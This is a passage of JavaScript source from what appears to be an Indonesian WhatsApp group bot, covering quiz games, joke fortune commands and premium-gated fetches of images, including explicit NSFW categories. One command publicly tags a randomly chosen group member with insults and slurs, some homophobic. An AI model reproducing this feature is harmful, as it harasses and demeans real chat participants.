text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
caklontong[m.chat] = [
await juna.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\nSoal : ${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (caklontong[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete caklontong[m.chat]
}
}, 120000)
]
}
break
case 'tekateki': {
if (caklontong[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: caklontong[m.chat][0]
})
if (susunkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: susunkata[m.chat][0]
})
if (tebaktebakan[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaktebakan[m.chat][0]
})
if (tebaklirik[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebaklirik[m.chat][0]
})
if (tebakkimia[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkimia[m.chat][0]
})
if (siapaaku[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: siapaaku[m.chat][0]
})
if (tebakkalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkalimat[m.chat][0]
})
if (tebakbendera[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakbendera[m.chat][0]
})
if (tebakkata[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakkata[m.chat][0]
})
if (asahotak[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: asahotak[m.chat][0]
})
if (lengkapikalimat[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: lengkapikalimat[m.chat][0]
})
if (tebakgame[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgame[m.chat][0]
})
if (tebakhero[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakhero[m.chat][0]
})
if (tebakaplikasi[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakaplikasi[m.chat][0]
})
if (tebakgambar[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tebakgambar[m.chat][0]
})
if (tekateki[m.chat]) return juna.sendMessage(m.chat, {
text: "Soal ini belum selesai"
}, {
quoted: tekateki[m.chat][0]
})
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (isGame(m.sender, isPremium, isCreator, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (!isCreator && !isPremium) { gameAdd(m.sender, glimit) }
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
let result = anu[Math.floor(Math.random() * anu.length)]
console.log("Jawaban: " + result.jawaban)
tekateki[m.chat] = [
await juna.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : ${(120000 / 1000).toFixed(2)} detik\n\n_Ketik .nyerah Untuk Menyerah..._\n_Ketik .bantuan Untuk Petunjuk..._`, m), result, 250,
setTimeout(() => {
if (tekateki[m.chat]) {
m.reply(waktuHabis(result.jawaban))
delete tekateki[m.chat]
}
}, 120000)
]
}
break
case 'bantuan': {
if (m.chat in tebakgambar) {
let json = tebakgambar[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakgame) {
let json = tebakgame[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakhero) {
let json = tebakhero[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakaplikasi) {
let json = tebakaplikasi[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakkata) {
let json = tebakkata[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in asahotak) {
let json = asahotak[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in lengkapikalimat) {
let json = lengkapikalimat[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakbendera) {
let json = tebakbendera[m.chat][1]
m.reply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakkalimat) {
let json = tebakkalimat[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in siapaaku) {
let json = siapaaku[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebakkimia) {
let json = tebakkimia[m.chat][1]
m.reply('```' + json.unsur.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebaklirik) {
let json = tebaklirik[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tebaktebakan) {
let json = tebaktebakan[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in susunkata) {
let json = susunkata[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in caklontong) {
let json = caklontong[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
if (m.chat in tekateki) {
let json = tekateki[m.chat][1]
m.reply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
}
}
break
case 'nyerah': {
if (m.chat in siapaaku) {
clearTimeout(siapaaku[m.chat][3])
delete siapaaku[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in tebakkalimat) {
clearTimeout(tebakkalimat[m.chat][3])
delete tebakkalimat[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in tebakbendera) {
juna.sendMessage(m.chat, { delete: tebakbendera[m.chat][0].key })
clearTimeout(tebakbendera[m.chat][3])
delete tebakbendera[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in tebakkata) {
clearTimeout(tebakkata[m.chat][3])
delete tebakkata[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in asahotak) {
clearTimeout(asahotak[m.chat][3])
delete asahotak[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in lengkapikalimat) {
clearTimeout(lengkapikalimat[m.chat][3])
delete lengkapikalimat[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in tebakgame) {
juna.sendMessage(m.chat, { delete: tebakgame[m.chat][0].key })
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in tebakhero) {
juna.sendMessage(m.chat, { delete: tebakhero[m.chat][0].key })
clearTimeout(tebakhero[m.chat][3])
delete tebakhero[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in tebakaplikasi) {
juna.sendMessage(m.chat, { delete: tebakaplikasi[m.chat][0].key })
clearTimeout(tebakaplikasi[m.chat][3])
delete tebakaplikasi[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in tebakkimia) {
clearTimeout(tebakkimia[m.chat][3])
delete tebakkimia[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in tebaklirik) {
clearTimeout(tebaklirik[m.chat][3])
delete tebaklirik[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in tebaktebakan) {
clearTimeout(tebaktebakan[m.chat][3])
delete tebaktebakan[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in susunkata) {
clearTimeout(susunkata[m.chat][3])
delete susunkata[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in caklontong) {
clearTimeout(caklontong[m.chat][3])
delete caklontong[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in tebakgambar) {
juna.sendMessage(m.chat, { delete: tebakgambar[m.chat][0].key })
clearTimeout(tebakgambar[m.chat][3])
delete tebakgambar[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
if (m.chat in tekateki) {
clearTimeout(tekateki[m.chat][3])
delete tekateki[m.chat]
return juna.sendMessage(m.chat, {text: `_*Cihhh.. Manja, Gitu Doang Nyerah*_ 😏`}, {quoted: fkontak})
}
}
break
//asupan
case'chika': case'rikagusriani': case'bocil': case'geayubi': case'santuy': case'ukhty': case'asupan': case'delvira': case'ayu': case'bunga': case'aura': case'nisa': case'ziva': case'yana': case'viona': case'syania': case'riri': case'syifa': case'mama_gina': case'alcakenya': case'mangayutri': {
if (!isCreator && !isPremium)return m.reply(mess.OnlyPrem)
m.reply(mess.wait)
juna.sendMessage(m.chat, {video: {url: `https://api.zeeoneofc.my.id/api/asupan/${command}?apikey=${setting.BotKey}`, mimetype:'video/mp4'}, caption: 'Nih asupan guys 😋'},{quoted: m})
.catch((err) => {
m.reply(util.format(err))
})
}
break
//cewek asia
case'vietnam': case'malaysia': case'korea': case'indonesia': case'japan': case'thailand': case'china':
{
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
m.reply(mess.wait)
let cecan = await getBuffer(`https://andigans.cyclic.app/api/cecan/${command}?apikey=Softbots`)
await juna.sendMessage(m.chat, {image: cecan, caption: `Nih kak foto ${command} nya 😋`},{quoted: m})
}
break
case'jiso': case'lisa': case'rose':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
m.reply(mess.wait)
let cecan = await getBuffer(`https://api.zeeoneofc.my.id/api/cecan/${command}?apikey=${setting.BotKey}`)
await juna.sendMessage(m.chat, {image: cecan, caption: `Nih kak foto ${command} nya 😋`},{quoted: m})
}
break
//cogan
case'wuyifan': case'suga': case'parkchanyeol': case'ohsehun': case'luhan': case'kimtaehyung': case'kimsoek': case'kimnanjoon': case'kimminseok': case'kimjunmyeon': case'kimjong': case'kimjondae': case'jungkook': case'jimin': case'jhope': case'huangzitao': case'dohkyungsoo': case'baekhyung':
{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
m.reply(mess.wait)
let cogan = await getBuffer(`https://api.zeeoneofc.my.id/api/cogan/${command}?apikey=${setting.BotKey}`)
await juna.sendMessage(m.chat, {image: cogan, caption: 'Nih Kak Cowok Gantengnya 😋'},{quoted: m})
}
break
//nsfw
case'baka':case'smug':case'neko_sfw':case'hentai_gif':case'spank':case'blowjob':case'cumarts':case'eroyuri':case'eroneko':case'erokemonomimi':case'erokitsune':case'ero':case'feet':case'erofeet':case'feetgif':case'femdom':case'futanari':case'hentai':case'holoero':case'holo':case'keta':case'kitsune':case'kemonomimi':case'pussyart':case'pussywankgif':case'girl_solo':case'girl_solo_gif':case'tits':case'trap':case'yuri':case'avatar2':case'anal':case'bj':case'boobs':case'classic':case'cumsluts':case'kuni':case'lesbian':case'neko':case'neko_gif':case'ahegao':case'bdsm':case'cuckold':case'cum':case'foot':case'gangbang':case'glasses':case'jahy':case'masturbation':case'nsfw_neko':case'orgy':case'panties':case'tentacles':case'thighs':case'zettai':{
if (!m.isGroup)return m.reply(mess.OnlyGrup)
if (!isCreator&&!isPremium) return m.reply('Fitur khusus user premium!')
if (!isNsfw && !m.key.fromMe && !isCreator) return m.reply('Fitur nsfw belum di aktifkan')
m.reply(mess.wait)
let baka = await getBuffer(`https://api.zeeoneofc.my.id/api/nsfw/${command}?apikey=${setting.BotKey}`)
await juna.sendMessage(m.chat, {image: baka, caption: `Nih ${command} Nya 😋`},{quoted: m})
}
break
case 'sewabot': case 'daftarprem': case 'buyprem': case 'price': case 'sewa': {
const { sewanya} = require('./menu') 
m.reply(`${sewanya}`)
}
break
// Fun Menu
case 'apakah': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul','Kagak tau gw 🗿','Kenapa tanya gw?🗿','Maleslah mau makan dulu']
const kah = apa[Math.floor(Math.random() * apa.length)]
m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'bisakah': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'bagaimanakah': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
m.reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'rate': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
m.reply(`Rate : ${q}\nJawaban : *${te}%*`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'gantengcek': case 'cekganteng': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
m.reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break           
case 'cantikcek': case 'cekcantik': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
m.reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'ceksifat': case 'sifatcek': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
var a = await randomNomor(100)
var b = await randomNomor(100)
let ce = ['Baik Hati', 'Sombong', 'Pelit', 'Dermawan', 'Rendah Hati', 'Rendah Diri', 'Pemalu', 'Penakut', 'Pengusil', 'Cengeng']
const c = ce[Math.floor(Math.random() * ce.length)]
let de = ['Rajin', 'Malas', 'Membantu', 'Ngegosip', 'Jail', 'Gak jelas', 'Shoping', 'Chattan sama Doi', 'Chattan di WA karna Jomblo', 'Sedih', 'Kesepian', 'Bahagia']
const d = de[Math.floor(Math.random() * de.length)]
var e = await randomNomor(100)
var f = await randomNomor(100)
var g = await randomNomor(100)
var h = await randomNomor(100)
let cksft = `*SIFAT ${text}* 🔖\n\n❏ Nama : *${text}*\n❏ Ahlak Baik : *${a}%*\n❏ Ahlak Buruk : *${b}%*\n❏ Orang yang : *${c}*\n❏ Selalu : *${d}*\n❏ Kecerdasan : *${e}%*\n❏ Kenakalan : *${f}%*\n❏ Keberanian : *${g}%*\n❏ Ketakutan : *${h}%*`
m.reply(cksft)
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'masadepan': case 'masadepannya': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
var a = await randomNomor(10)
var b = await randomNomor(10)
var c = await randomNomor(10)
var d = await randomNomor(10)
var e = await randomNomor(10)
var f = await randomNomor(10)
var g = await randomNomor(10)
var h = await randomNomor(10)
let msdpn = [
        `${text} akan menjadi orang yang kaya, keluarga yang harmonis, memiliki ${b} anak, memiliki ${d}, memiliki kendaraan, memiliki rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang harmonis, memiliki ${c}, memiliki ${a} anak, memiliki kendaraan, memiliki rumah`,
        `${text} akan menjadi orang yang miskin, keluarga yang sederhana, memiliki ${a} anak, tidak memiliki kendaraan, rumah ngontrak`,
        `${text} akan menjadi orang yang sederhana, keluarga yang dicerai, memiliki ${e} anak, memiliki ${b} kendaraan, memiliki ${b} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang sederhana, memiliki ${b} anak, memiliki ${b} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang miskin, keluarga yang dicerai memiliki ${b} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang kaya, keluarga yang sederhana, memiliki ${a} anak, memiliki ${a} kendaraan, memiliki ${b} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang harmonis, memiliki ${a} anak, memiliki ${c} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang miskin, tidak memiliki keluarga (jomblo), tidak memiliki anak, tidak memiliki kendaraan, tidak memiliki rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang sederhana, memiliki ${d} anak, memiliki ${a} kendaraan, memiliki ${b} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang kacau, tidak memiliki anak (Gugur), memiliki ${b} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang sangat kaya, keluarga yang sangat harmonis, memiliki ${e} anak, memiliki ${f} kendaraan, memiliki ${g} rumah`,
        `${text} akan menjadi orang yang sangat miskin, keluarga yang sederhana, memiliki ${g} anak, tidak memiliki kendaraan, rumah ngontrak`,
        `${text} akan menjadi orang yang kaya, keluarga yang pelit, memiliki ${b} anak, memiliki ${b} kendaraan, memiliki ${b} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang pelit, memiliki ${a} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang dicerai, memiliki ${b} anak, memiliki ${a} kendaraan, rumah ngontrak`,
        `${text} akan menjadi orang yang sangat sederhana, keluarga yang sakinah, memiliki ${a} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang sangat sederhana, memiliki ${a}${a} anak, memiliki ${a} kendaraan, memiliki ${a} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang sangat sederhana, memiliki ${b} anak kembar, memiliki ${c} kendaraan, memiliki ${b} rumah`,
        `${text} akan menjadi orang yang sederhana, keluarga yang sederhana, memiliki ${b} anak kembar dan ${a} anak lagi, memiliki ${a} kendaraan, memiliki ${a} rumah`,
    ]
    const msdpan = msdpn[Math.floor(Math.random() * msdpn.length)]
  m.reply(msdpan)
    if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'bego':
case 'goblok':
case 'janda':
case 'perawan':
case 'babi':
case 'tolol':
case 'pinter':
case 'pintar':
case 'asu':
case 'bodoh':
case 'gay':
case 'lesby':
case 'bajingan':
case 'jancok':
case 'anjing':
case 'ngentod':
case 'ngentot':
case 'monyet':
case 'mastah':
case 'newbie':
case 'bangsat':
case 'bangke':
case 'sange':
case 'sangean':
case 'dakjal':
case 'horny':
case 'wibu':
case 'puki':
case 'peak':
case 'pantex':
case 'pantek':
case 'setan':
case 'iblis':
case 'cacat':
case 'yatim':
case 'piatu': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      let member = participants.map(u => u.id).filter(v => v !== juna.user.jid)
      let org = member[Math.floor(Math.random() * member.length)];
      juna.sendMessage(m.chat, { text: `Anak ${command} di sini adalah @${org.split('@')[0]}`, mentions: [org] }, { quoted: m })
      }
      break;
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
m.reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'kapankah': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
m.reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'wangy': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Contoh : ${prefix}wangy Juna`)
qq = q.toUpperCase()
awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
m.reply(awikwok)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case'waktu': case'time': case'cekwaktu':{
let baru = hitungmundur(1, 1, 2025)
let ramadhan = hitungmundur(10, 3, 2024) 
let natal = hitungmundur(25, 12, 2025) 
await loading() 
await juna.sendMessage(m.chat, {
text: `*WAKTU INFO*\n\n\n*Jam* : ${jam}\n\n*Ramadhan* :\n${ramadhan}\n\n*Tahun Baru* :\n${baru}\n\n*Natal* :\n${natal}\n\n\n_Manfaatkan Lah Waktu Sempatmu, Sebelum Datang Waktu Sempitmu, Karena Momen Berharga Tak Mungkin Dapat Terulang Kembali_ >_<`,
contextInfo: {
externalAdReply: {  
title: botName,
body: 'The best of WhatsApp Bot',
thumbnailUrl: pathimg,
sourceUrl: gcwa,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: fkontak})
}
break
